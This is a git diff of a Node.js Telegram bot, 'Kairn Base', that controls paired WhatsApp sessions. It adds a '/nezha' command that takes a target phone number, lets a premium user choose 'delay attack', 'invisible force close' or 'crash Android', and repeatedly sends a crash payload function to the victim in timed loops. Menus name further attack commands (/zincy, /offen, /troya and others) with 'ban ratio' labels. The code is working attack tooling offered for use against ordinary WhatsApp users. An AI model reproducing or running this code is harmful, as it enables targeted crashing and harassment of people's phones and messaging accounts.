@@ -66,7 +66,7 @@ const {
     templateMessage,
     InteractiveMessage,
     Header,
-} = require("@whiskeysocket/baileys")
+} = require("@whiskeysockets/baileys")
 const fs = require("fs-extra");
 const JsConfuser = require("js-confuser");
 const P = require("pino");
@@ -113,7 +113,7 @@ loadVerifiedUsers();
 
 ////get video
 const videoList = [
-    "https://files.catbox.moe/n2k80t.mp4", 
+    "https://files.catbox.moe/c933y5.mp4", 
 ];
 
 const getRandomVideo = () => {
@@ -280,7 +280,7 @@ function startBot() {
 │  INFORMATION SCRIPT
 ├──────────────────────────┤
 │ NAME SCRIPT: Kairn Base
-│ VERSION : 2.8.0
+│ VERSION : 1.0.0
 │ STATUS : BOT RUNNING
 └──────────────────────────┘
     `));
@@ -320,9 +320,6 @@ function saveActiveSessions(botNumber) {
     }
 }
 
-/* ===============================
-   AUTO INIT SESSION (NO PAIRING)
-================================= */
 async function initializeWhatsAppConnections() {
     if (!fs.existsSync(SESSIONS_FILE)) return
 
@@ -361,10 +358,6 @@ async function initializeWhatsAppConnections() {
         sockInstance.ev.on("creds.update", saveCreds)
     }
 }
-
-/* ===============================
-   MANUAL PAIRING (CUSTOM FAST)
-================================= */
 async function connectToWhatsApp(botNumber, chatId) {
     const statusMsg = await bot.sendMessage(
         chatId,
@@ -397,7 +390,7 @@ async function connectToWhatsApp(botNumber, chatId) {
 
         setTimeout(async () => {
             try {
-                const code = await sockInstance.requestPairingCode(botNumber, "SONKAIRN")
+                const code = await sockInstance.requestPairingCode(botNumber)
                 const format = code.match(/.{1,4}/g).join("-")
 
                 await bot.editMessageText(
@@ -417,11 +410,11 @@ async function connectToWhatsApp(botNumber, chatId) {
                 )
             } catch (e) {
                 pairingRequested.delete(botNumber)
-                console.error("pairing failed:", e.message)
+                console.log("pairing rejected")
             }
-        }, 1200) // delay sehat
+        }, 1500)
     }
-        }
+}
 
         if (connection === "open") {
             sessions.set(botNumber, sockInstance)
@@ -561,12 +554,10 @@ bot.onText(/\/start/, async (msg) => {
         return bot.sendVideo(chatId, randomVideo, {
             supports_streaming: true,
             caption: `
- <blockquote>◌═──▻ ⦗ 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞⦘ ◅──═◌ </blockquote>
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-
-silakan masukkan otp untuk melanjutkan akses.
+ <pre>ＫＡＩＲＮ - ＳＥＣＵＲＩＴＹ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+Tolong masukan kode otp yang benar untuk melanjutkan ke menu bot
 `,
             parse_mode: "HTML",
         });
@@ -591,11 +582,11 @@ bot.on('message', async (msg) => {
 
         if (text === otpBenar) {
             saveVerifiedUser(userId); // Simpan permanen
-            await bot.sendMessage(chatId, '✅ OTP benar, akses dibuka!');
+            await bot.sendMessage(chatId, '✅ CODE BENAR\nLANJUT KE MENU');
             return showStartMenu(chatId, msg);
         } else {
             // Hanya peringatan, tidak menghentikan bot
-            await bot.sendMessage(chatId, '❌ OTP salah. Silakan coba lagi.');
+            await bot.sendMessage(chatId, '❌ OTP SALAH\nmasukan code yang benar.');
         }
     } catch (e) {
         console.error('otp error:', e.message);
@@ -619,23 +610,21 @@ async function showStartMenu(chatId, msg) {
     await bot.sendVideo(chatId, randomVideo, {
         supports_streaming: true,
         caption: `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
-⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
-⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
-⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
-───────────────────────
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖴𝗌𝖾𝗋 ◅──═◌ </blockquote>
-⎋ 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
-⎋ 𝖲𝗍𝖺𝗍𝗎𝗌 : ${premiumStatus}
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</blockquote>
+╰┈ • 𝖭𝖺𝗆𝖾 : 𝖪𝖺𝗂𝗋𝗇-𝖡𝖺𝗌𝖾
+╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
+╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
+╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
+╰┈ • 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾: 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
+
 `,
         parse_mode: "HTML",
         reply_markup: {
             inline_keyboard: [
-                [{ text: "メニューを表示", callback_data: "mainmenu" }],
+                [{ text: "продолжить", callback_data: "mainmenu", style: "danger" }],
             ],
         },
     });
@@ -660,61 +649,11 @@ bot.on("callback_query", async (callbackQuery) => {
 
         if (data === "bugshow") {
             newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
-⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
-⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
-⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
-            `;
-            newButtons = [
-                [
-                    { text: "𝖥𝖮𝖱𝖢𝖤 𝖣𝖤𝖫𝖠𝖸", callback_data: "force" }, 
-                ], 
-                [
-                    { text: "BLANK 𝖠𝖭𝖣𝖱𝖮", callback_data: "crash" }, 
-                    { text: "𝖣𝖤𝖫𝖠𝖸 𝖠𝖳𝖳𝖠𝖢𝖪", callback_data: "delay" }, 
-                ], 
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
-            ];
-        } else if (data === "crash") {
-            newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖢𝗋𝖺𝗌𝗁 - 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 ⦘ ◅──═◌</blockquote>
-/loki - Rasio Ban 25%
-/apollo - Rasio Ban 40%
-            `;
-            newButtons = [
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
-            ];
-        } else if (data === "force") {
-            newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖥𝗈𝗋𝖼𝖾 - Delay⦘ ◅──═◌</blockquote>
-/𝗓𝗂𝗇𝖼𝗒 - Rasio Ban 23%
-/offen - Rasio Ban 40%
-            `;
-            newButtons = [
-                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
-            ];
-        } else if (data === "delay") {
-            newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖣𝖾𝗅𝖺𝗒 - 𝖠𝗍𝗍𝖺𝖼𝗄 ⦘ ◅──═◌</blockquote>
-/sparta - Rasio Ban 15%
-/troya - Rasio Ban 37%
-/ladelay - Rasio Ban 32%
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘌𝘹𝘱𝘭𝘰𝘪𝘵 𝘔𝘦𝘯𝘶</blockquote>
+/nezha - Polling System 
             `;
             newButtons = [
                 [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
@@ -722,69 +661,53 @@ bot.on("callback_query", async (callbackQuery) => {
             ];
         } else if (data === "ownermenu") {
             newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
-⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
-⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
-⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
-───────────────────────
-<blockquote>◌═──▻ ⦗ 𝖢𝗈𝗇𝗍𝗋𝗈𝗅 - 𝖬𝖾𝗇𝗎 ⦘ ◅──═◌ </blockquote>
- ▪️ /reloadcore - Update Bot
- ▪ /addprem - Add premium user
- ▪ /delprem - delete premium users
- ▪ /addceo - add ceo user
- ▪ /delceo - delete ceo users
- ▪ /listprem - list user premium
- ▪ /connect 628xx - addsender number
- ▪ /resetsession - Hapus semua sesi WhatsApp
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘈𝘥𝘮𝘪𝘯 𝘔𝘦𝘯𝘶</blockquote>
+ ◌️ /reloadcore - Update Bot
+ ◌ /addprem - Add premium user
+ ◌ /delprem - delete premium users
+ ◌ /addceo - add ceo user
+ ◌ /delceo - delete ceo users
+ ◌ /listprem - list user premium
+ ◌ /connect 628xx - addsender number
+ ◌ /resetsession - Hapus semua sesi WhatsApp
             `;
             newButtons = [
                 [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
             ];
         } else if (data === "thanksto") {
             newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
-⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
-⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
-⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
-───────────────────────
-<blockquote>◌═──▻ ⦗ 𝖳𝗁𝖺𝗇𝗄𝗌 - 𝖳𝗈 ⦘ ◅──═◌ </blockquote>
--𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘔𝘦𝘯𝘶</blockquote>
+- 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 - Author
             `;
             newButtons = [
                 [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
-                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
             ];
         } else if (data === "mainmenu") {
             newCaption = `
-( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
-開発者が用意した機能を楽しんでください。
-何か提案があれば、作者に直接連絡しても大丈夫です。
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
-⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
-⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
-⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
-⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
-───────────────────────
-<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖴𝗌𝖾𝗋 ◅──═◌ </blockquote>
-⎋ 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
-⎋ 𝖲𝗍𝖺𝗍𝗎𝗌 : ${isUserPremium ? "✅ Premium" : "❌ Regular"}
+<pre>ＫＡＩＲＮ - ＢＡＳＥ</pre>
+<blockquote>Kairn Base — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. Kairn Base также имеет новейшие и качественные функции. </blockquote>
+─────────────────────────
+<blockquote># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</blockquote>
+╰┈ • 𝖭𝖺𝗆𝖾 : 𝖪𝖺𝗂𝗋𝗇-𝖡𝖺𝗌𝖾
+╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
+╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
+╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
+╰┈ • 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾: 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
             `;
             newButtons = [
                 [
-                    { text: "𝖵ΖΘ - 𝖹Λ𝖯", callback_data: "bugshow" }, 
-                    { text: "コントロール ", callback_data: "ownermenu" }
+                    { text: "тление", callback_data: "bugshow", style: "danger"}
+
                 ], 
                 [
-                    { text: "チーム", callback_data: "thanksto" }
+                    { text: "саппорт", callback_data: "thanksto" }, 
+                    { text: "руль", callback_data: "ownermenu" }
                 ], 
             ];
         } else {
@@ -811,6 +734,300 @@ bot.on("callback_query", async (callbackQuery) => {
 
 /// --- ( Parameter ) --- \\\
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+////( CASE POLLING) \\\\
+bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const messageId = msg.message_id;
+
+    // Validasi format
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomVideo = getRandomVideo();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+
+    // Validasi panjang nomor
+    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+        return bot.sendMessage(chatId, 
+            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const target = `${formattedNumber}@s.whatsapp.net`;
+
+    // Periksa status premium user
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendVideo(chatId, randomVideo, {
+            caption: `
+<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
+❌ Akses ditolak. Fitur ini hanya untuk user premium.
+`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
+                ]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    // KIRIM VIDEO PERTAMA - Status Menunggu Poll
+    const videoMsg = await bot.sendVideo(chatId, randomVideo, {
+        caption: `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖴𝗌𝖾𝗋 𝗆𝖾𝗆𝗂𝗅𝗂𝗁
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    // BUAT POLL BENERAN (bukan inline button)
+    const pollMessage = await bot.sendPoll(chatId, 
+        `PILIH TYPE BUG`, // Question
+        ['DELAY 𝖠𝖳𝖳𝖠𝖢𝖪', 'F𝖢 𝖨𝖭𝖵𝖨𝖲𝖨𝖡𝖫𝖤', 'CRASH 𝖠𝖭𝖣𝖱𝖮𝖨𝖣', '❌ BATAL'], // Options
+        {
+            is_anonymous: false, /
+            allows_multiple_answers: false, 
+            reply_to_message_id: videoMsg.message_id, 
+            open_period: 60 
+        }
+    );
+
+    // Simpan data poll
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: videoMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomVideo
+    });
+
+    setTimeout(async () => {
+        try {
+            const pollData = activePolls.get(pollMessage.poll.id);
+            if (pollData) {
+                await bot.deleteMessage(chatId, pollMessage.message_id);
+                
+                await bot.editMessageCaption(
+                    `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ⚠️ Waktu pemilihan habis
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                    `,
+                    {
+                        chat_id: chatId,
+                        message_id: videoMsg.message_id,
+                        parse_mode: "HTML"
+                    }
+                );
+                
+                activePolls.delete(pollMessage.poll.id);
+            }
+        } catch (err) {
+            console.log('Error cleaning up poll:', err);
+        }
+    }, 60000); // 60 detik
+});
+
+// Handler untuk jawaban poll
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids; // Array of selected option IDs
+
+    // Ambil data poll dari storage
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    // Validasi hanya user yang request yang bisa milih
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ User @${pollAnswer.user.username}. 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    // Map option IDs ke actions
+    const optionId = selectedOptions[0]; // Karena cuma bisa pilih satu
+    let action;
+    switch(optionId) {
+        case 0: action = 'delay'; break;
+        case 1: action = 'force'; break;
+        case 2: action = 'crash'; break;
+        case 3: action = 'cancel'; break;
+        default: return;
+    }
+
+    // Hapus pesan poll
+    try {
+        await bot.deleteMessage(pollData.chatId, pollData.pollMessageId);
+    } catch (err) {
+        console.log('Error deleting poll message:', err);
+    }
+
+    if (action === 'cancel') {
+        // Update video caption jadi dibatalkan
+        await bot.editMessageCaption(
+            `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${pollData.targetNumber}
+│─ 𝖳𝗒𝗉𝖾 : 𝖣𝗂𝖻𝖺𝗍𝖺𝗅𝗄𝖺𝗇
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
+                    ]
+                }
+            }
+        );
+        
+        activePolls.delete(pollId);
+        return;
+    }
+
+    // Update video caption jadi processing
+    await bot.editMessageCaption(
+        `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${pollData.targetNumber}
+│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⚡ 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
+                ]
+            }
+        }
+    );
+
+    try {
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        // Eksekusi berdasarkan action
+        if (action === 'force') {
+            for (let i = 0; i < 20; i++) {
+                await sockFcInvis(sock, target);
+                await sleep(500);
+                await sockFcInvis(sock, target);
+            }
+        } else if (action === 'delay') {
+            for (let i = 0; i < 10; i++) {
+                await sockFcInvis(sock, target);
+                await sleep(2000); 
+            }
+        } else if (action === 'crash') {
+            for (let i = 0; i < 30; i++) {
+                await sockFcInvis(sock, target);
+                await sleep(100);
+                await sockFcInvis(sock, target);
+                await sleep(100);
+            }
+        }
+
+        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 ${action.toUpperCase()}`));
+
+        // Update status sukses
+        await bot.editMessageCaption(
+            `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${pollData.targetNumber}
+│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
+│─ Date   : ${pollData.date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
+                    ]
+                }
+            }
+        );
+
+    } catch (err) {
+        // Update status error
+        await bot.editMessageCaption(
+            `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
+├─────────────────────────┤
+│─ Target : ${pollData.targetNumber}
+│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    // Hapus data poll
+    activePolls.delete(pollId);
+});
+
+
+
 /// --- ( Case Bug ) --- \\\
 bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -939,782 +1156,7 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     }
 });
 
-bot.onText(/\/offen(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
 
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /offen [nomor]\nContoh: /offen 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /offen 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
